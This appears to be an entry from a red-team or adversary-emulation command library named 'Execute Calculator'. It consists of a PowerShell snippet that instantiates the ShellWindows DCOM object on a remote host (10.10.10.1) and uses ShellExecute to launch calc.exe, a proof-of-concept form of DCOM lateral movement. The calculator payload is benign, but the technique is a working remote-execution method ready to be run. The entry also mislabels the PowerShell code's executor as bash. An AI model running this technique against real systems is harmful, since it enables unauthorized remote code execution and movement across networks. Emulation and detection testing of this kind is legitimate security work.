---
id: 61a73abf-2776-4e6e-9cc4-9079d8f49dab
name: Execute Calculator
type: command
executor: bash
data: '$com = [Type]::GetTypeFromCLSID(''9BA05972-F6A8-11CF-A442-00A0C90A8F39'',"10.10.10.1")

  $obj = [System.Activator]::CreateInstance($com)

  $item = $obj.Item()

  $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)'
output: null
created_at: '2023-04-06T03:56:07.161707+00:00'
updated_at: '2023-04-10T20:25:47.023560+00:00'
---

# Execute Calculator

```bash
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```
